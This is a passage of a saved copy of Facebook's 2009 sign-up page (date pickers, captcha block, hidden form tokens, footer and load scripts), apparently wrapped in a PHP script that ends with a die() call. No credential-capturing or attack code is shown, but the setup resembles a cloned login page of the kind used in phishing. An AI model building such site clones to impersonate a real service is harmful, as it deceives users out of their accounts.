<option value="8">Aug</option>
<option value="9">Sep</option>
<option value="10">Oct</option>
<option value="11">Nov</option>
<option value="12">Dec</option>
</select> <select name="birthday_day" id="birthday_day"  autocomplete="off"><option value="-1">Day:</option><option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
<option value="5">5</option>
<option value="6">6</option>
<option value="7">7</option>
<option value="8">8</option>
<option value="9">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
</select> <select name="birthday_year" id="birthday_year" onchange="return wait_for_load(this, event, function() { editor_date_month_change(&quot;birthday_month&quot;,&quot;birthday_day&quot;,this); });" autocomplete="off"><option value="-1">Year:</option><option value="2009">2009</option>
<option value="2008">2008</option>
<option value="2007">2007</option>
<option value="2006">2006</option>
<option value="2005">2005</option>
<option value="2004">2004</option>
<option value="2003">2003</option>
<option value="2002">2002</option>
<option value="2001">2001</option>
<option value="2000">2000</option>
<option value="1999">1999</option>
<option value="1998">1998</option>
<option value="1997">1997</option>
<option value="1996">1996</option>
<option value="1995">1995</option>
<option value="1994">1994</option>
<option value="1993">1993</option>
<option value="1992">1992</option>
<option value="1991">1991</option>
<option value="1990">1990</option>
<option value="1989">1989</option>
<option value="1988">1988</option>
<option value="1987">1987</option>
<option value="1986">1986</option>
<option value="1985">1985</option>
<option value="1984">1984</option>
<option value="1983">1983</option>
<option value="1982">1982</option>
<option value="1981">1981</option>
<option value="1980">1980</option>
<option value="1979">1979</option>
<option value="1978">1978</option>
<option value="1977">1977</option>
<option value="1976">1976</option>
<option value="1975">1975</option>
<option value="1974">1974</option>
<option value="1973">1973</option>
<option value="1972">1972</option>
<option value="1971">1971</option>
<option value="1970">1970</option>
<option value="1969">1969</option>
<option value="1968">1968</option>
<option value="1967">1967</option>
<option value="1966">1966</option>
<option value="1965">1965</option>
<option value="1964">1964</option>
<option value="1963">1963</option>
<option value="1962">1962</option>
<option value="1961">1961</option>
<option value="1960">1960</option>
<option value="1959">1959</option>
<option value="1958">1958</option>
<option value="1957">1957</option>
<option value="1956">1956</option>
<option value="1955">1955</option>
<option value="1954">1954</option>
<option value="1953">1953</option>
<option value="1952">1952</option>
<option value="1951">1951</option>
<option value="1950">1950</option>
<option value="1949">1949</option>
<option value="1948">1948</option>
<option value="1947">1947</option>
<option value="1946">1946</option>
<option value="1945">1945</option>
<option value="1944">1944</option>
<option value="1943">1943</option>
<option value="1942">1942</option>
<option value="1941">1941</option>
<option value="1940">1940</option>
<option value="1939">1939</option>
<option value="1938">1938</option>
<option value="1937">1937</option>
<option value="1936">1936</option>
<option value="1935">1935</option>
<option value="1934">1934</option>
<option value="1933">1933</option>
<option value="1932">1932</option>
<option value="1931">1931</option>
<option value="1930">1930</option>
<option value="1929">1929</option>
<option value="1928">1928</option>
<option value="1927">1927</option>
<option value="1926">1926</option>
<option value="1925">1925</option>
<option value="1924">1924</option>
<option value="1923">1923</option>
<option value="1922">1922</option>
<option value="1921">1921</option>
<option value="1920">1920</option>
<option value="1919">1919</option>
<option value="1918">1918</option>
<option value="1917">1917</option>
<option value="1916">1916</option>
<option value="1915">1915</option>
<option value="1914">1914</option>
<option value="1913">1913</option>
<option value="1912">1912</option>
<option value="1911">1911</option>
<option value="1910">1910</option>
<option value="1909">1909</option>
<option value="1908">1908</option>
<option value="1907">1907</option>
<option value="1906">1906</option>
<option value="1905">1905</option>
<option value="1904">1904</option>
<option value="1903">1903</option>
<option value="1902">1902</option>
<option value="1901">1901</option>
<option value="1900">1900</option>
</select></div></td></tr>
<tr><td class="label"></td><td><div id="birthday_warning"><a onclick="return wait_for_load(this, event, function() { RegUtil.getInstance().show_birthday_help(); return false; });" title="Click for more information">Why do I need to provide this?</a></a></div></td></tr>
</table><input type="hidden" id="referrer" name="referrer" value="116" /><input type="hidden" id="challenge" name="challenge" value="d4a2b76d187b8322b0ac23f5765c6d7f" /><input type="hidden" id="md5pass" name="md5pass" value="" /><div class="reg_btn clearfix"><div class="UILinkButton UILinkButton_SU""><input type="submit" class="UILinkButton_A" onclick="return wait_for_load(this, event, function() { seo_tracking_onclick(this,&quot;facebookpoc&quot;,&quot;facebookpoc&quot;,&quot;1&quot;,&quot;1&quot;,&quot;Signup&quot;,&quot;Simple Reg Box&quot;);RegUtil.getInstance().ajax_validate_data({ignore: [&#039;captcha&#039;]}, &#039;registration_container&#039;, &#039;1&#039; ); return false; });" tabindex="1" value="Sign Up" /><div class="UILinkButton_RW"><div class="UILinkButton_R"></div></div></div><div id="async_status" class="async_status" style="display: none"><img src="http://static.ak.fbcdn.net/images/loaders/indicator_blue_small.gif?8:111099" alt="" /></div></div></div><div id="reg_captcha" style="display: none;"><h2>Security Check</h2><div id="outer_captcha_box"><div id="captcha_box"><div class="field_error" id="captcha_response_error" style="display:none;">This field is required.</div><div id="captcha" class="captcha">
  <input type="hidden" id="captcha_persist_data" name="captcha_persist_data" value="AAAAAQAQwcHrpuk9l_6HbWJf1mhZCAAAAGvqENqFy5KkvMip5AIv3QSF7BS7goiHfAC7fTkzr8hW60InDl47TxG_U-nIGUv-vA4xc_DDdfrNfXiNTps2se6OiwSYRJ37Sp8fPtKrFLQLh2tAbo5USXWuVjzv_KD1SMyTWhf34AGorQd27dFqZc0a" /><div class="captcha_challenge"><div id="recaptcha_scripts" style="display:none"></div><input type="hidden" id="captcha_session" name="captcha_session" value="ARdK66k8I7SXLQoYoM5O_Q" /><input type="hidden" id="extra_challenge_params" name="extra_challenge_params" value="authp=nonce.tt.time.new_audio_default&amp;psig=aCjTiakd7HrtVm6SwAq6zApKXTQ&amp;nonce=ARdK66k8I7SXLQoYoM5O_Q&amp;tt=xvi8Kb68AHse5VT6TLMXNouAT9U&amp;time=1245030569&amp;new_audio_default=1" />
    <div class="recaptcha_text">Enter <strong>both words</strong> below, <strong>separated by a space</strong>.<br /><div class="recaptcha_only_if_image">Can't read the words below? <a href="#" id="recaptcha_reload_btn" onclick="return wait_for_load(this, event, function() { Recaptcha.reload(); return false });" tabindex="-1">Try different words</a> or <a href="#" onclick="return wait_for_load(this, event, function() { Recaptcha.switch_type(&#039;audio&#039;); return false });" tabindex="-1">an audio captcha</a>.</div><div class="recaptcha_only_if_audio"><a href="#" id="recaptcha_reload_btn" onclick="return wait_for_load(this, event, function() { Recaptcha.reload(); return false });" tabindex="-1">Try different words</a> or <a href="#" class='recaptcha_only_if_audio' onclick="return wait_for_load(this, event, function() { Recaptcha.switch_type('image'); return false });" tabindex='-1'>back to text.</a></div></div><span id='recaptcha_play_audio'></span><div class="audiocaptcha"></div><div id="recaptcha_image"></div><div id="recaptcha_loading" class="fbloading"><span>Loading...</span></div></div><div class="captcha_refresh"></div><div class="captcha_input"><label>Text in the box:</label><div class="field_container"><input type="text" name="captcha_response" id="captcha_response" autocomplete="off" /></div><div style="margin-left: 15px; display: inline;"><a href="#" id="captcha_whatsthis" onclick="return wait_for_load(this, event, function() { captcha_whatsthis(this); return false });">What's This?</a></div>
  </div>
</div></div></div><div id="captcha_buttons" class="clearfix" style="display: none;"><div id="back_button" class="gridCol"><div class="cancel_button_image">&nbsp;</div><a href="#" onclick="return wait_for_load(this, event, function() { RegUtil.getInstance().hide_captcha(); RegUtil.getInstance().show_reg_form(); return false; });" id="cancel_button">Back</a></div><div id="A_btn_sign_up" class="gridCol"><div><div class="UILinkButton UILinkButton_SU""><input type="submit" class="UILinkButton_A" onclick="return wait_for_load(this, event, function() { RegUtil.getInstance().ajax_validate_data(&#039;&#039;, &#039;registration_container&#039;, &#039;1&#039;);return false; });" value="Sign Up" /><div class="UILinkButton_RW"><div class="UILinkButton_R"></div></div></div><div id="captcha_async_status" class="async_status" style="display: none"><img src="http://static.ak.fbcdn.net/images/loaders/indicator_blue_small.gif?8:111099" alt="" /></div></div></div></div></div></form>
<div id="reg_progress" style="display: none"><div id="progress_wrap"><img src="http://static.ak.fbcdn.net/images/loaders/indicator_blue_small.gif?8:111099" alt="" /><div id="progress_msg">Registering&hellip;</div></div></div><div id="reg_error" style="display: none"><div id="reg_error_inner">An error occurred. Please try again.</div></div><div id="tos_container" class="tos_container hidden_elem"><p class="legal_tos">By clicking Sign Up, you are indicating that you have read and agree to the <a href="/terms.php" target="_blank" rel="nofollow">Terms of Use</a> and <a href="/policy.php" target="_blank" rel="nofollow">Privacy Policy</a>.</p></div><div id="reg_pages_msg" >To create a page for a celebrity, band or business, <a href="http://www.facebook.com/pages/create.php">click here</a>.</div></form></div><form id="confirmation_email_form" method="POST" action="https://register.facebook.com/r.php"><input type="hidden" id="locale" name="locale" value="en_US" /><input type="hidden" id="confirmation_email" name="ce" value="" /></form></div></div></div></div></div></div></div></div></div></div></div></div><div id="pagefooter" class= "pagefooter_minimal"><div class="pagefooter_topborder clearfix"><div class="copyright_and_location clearfix"><div class="copyright" id="pagefooter_copyright"><span title="PHP">Facebook </span><span id="rtime" title="139">&copy;</span> <span title="10.129.58.107">20</span><span title="22321928">09</span></div><div id="locale_selector_dialog_onclick"><a onclick="return wait_for_load(this, event, function() { intl_locale_selector_dialog(&quot;http:\/\/www.facebook.com\/index.php&quot;); });" title="English (US)">English (US)</a></div></div><div id="pagefooter_links"><ul id="pagefooter_left_links"><li><a href="http://www.facebook.com/login.php?ref=pf">Login</a></li><li><a href="http://www.facebook.com/facebook?ref=pf" accesskey="7" rel="nofollow">About</a></li><li><a href="http://www.facebook.com/advertising/?src=pf">Advertising</a></li><li><a href="http://developers.facebook.com/?ref=pf">Developers</a></li><li><a href="http://www.facebook.com/careers/?ref=pf">Careers</a></li><li><a href="http://www.facebook.com/terms.php?ref=pf" accesskey="8" rel="nofollow">Terms</a></li><li><span><img alt=""  class="li_bullet spritemap_icons sx_icons_pagefooter_bullet" src="http://static.ak.fbcdn.net/images/spacer.gif?8:11"></span></li></ul><ul id="pagefooter_right_links"><li><a href="http://www.facebook.com/find-friends/?ref=pf">Find Friends</a></li><li><a href="http://www.facebook.com/policy.php?ref=pf" accesskey="6" rel="nofollow">Privacy</a></li><li><a href="http://www.facebook.com/mobile/?ref=pf" accesskey="5">Mobile</a></li><li><a href="http://www.facebook.com/help.php?ref=pf" accesskey="0" rel="nofollow">Help</a></li></ul></div></div></div><div id="js_buffer"><script type="text/javascript">

onloadRegister(function(){Bootloader.configurePage({"http:\/\/static.ak.fbcdn.net\/rsrc.php\/zAGCS\/lpkg\/dxa085ml\/en_US\/141\/168449\/css\/5xxvsqmpkl4wk0kg.pkg.css":["css\/5xxvsqmpkl4wk0kg.pkg.css",true],"http:\/\/static.ak.fbcdn.net\/rsrc.php\/z2SEH\/lpkg\/6e6jtn9s\/en_US\/141\/167140\/css\/9wzufavzfjcogsgk.pkg.css":["css\/9wzufavzfjcogsgk.pkg.css",false],"http:\/\/static.ak.fbcdn.net\/rsrc.php\/zCYNY\/lpkg\/1z622p1t\/en_US\/141\/167114\/css\/aubdlzq1p80sw40o.pkg.css":["css\/aubdlzq1p80sw40o.pkg.css",true]});
Bootloader.done(["css\/5xxvsqmpkl4wk0kg.pkg.css","css\/9wzufavzfjcogsgk.pkg.css","css\/aubdlzq1p80sw40o.pkg.css"]);
});

onloadRegister(function (){if (window.Env) { Env["nctrlid"]="5d21206b2830d2184bee42b6164223d8"; };});
onloadRegister(function (){if (window.Env) { Env["nctrlnid"]=""; };});
onloadRegister(function (){if (window.NectarPhotosLog) {
          Arbiter.subscribe(NectarPhotosLog.NECTAR_LOG,
            NectarPhotosLog.arbiterHandler);
          onbeforeunloadRegister(function() {
              Arbiter.inform(NectarPhotosLog.NECTAR_LOG, {"flush" : true});
              }, false);
          };});
onloadRegister(function (){focus_login(0, true);
new MenuBar("fb_menubar_core").setTimeoutInterval(250).init();
new MenuBar("fb_menubar_aux").setTimeoutInterval(100).init();;});
onloadRegister(function (){new RegKeyPressListen(1);;});
onloadRegister(function (){new CaptchaBoxKeyPressListen('1', 'registration_container', '1');;});
onloadRegister(function (){regform_listen_focus("reg", "form_focus");;});
onloadRegister(function (){ffid='m/KCDbSsEFNigYija0piBA==';;});
onloadRegister(function (){window.loading_page_chrome = true;;});
onloadRegister(function (){window.loading_page_chrome = false;;});
onloadRegister(function (){var n = "rtime"; (window.ge && ge(n)) && (ge(n).title += " | 142");;});
onloadRegister(function (){
      onbeforeunloadRegister(function () {
        window.setCookie && window.setCookie("cvr_tx", (new Date()).getTime(), 10000);
        }, true);;});
onafterloadRegister(function (){seo_tracking_onload("facebookpoc","facebookpoc","1","1","Welcome","","1244791216dd17c735dbb07bac204b47151ead5648550abfa7fb606efa32b49","Welcome","www.facebook.com","en_US","en_US","en_US","US","Logged Out","");});


</script></div></body>
</html>
<?php
die();
}
?>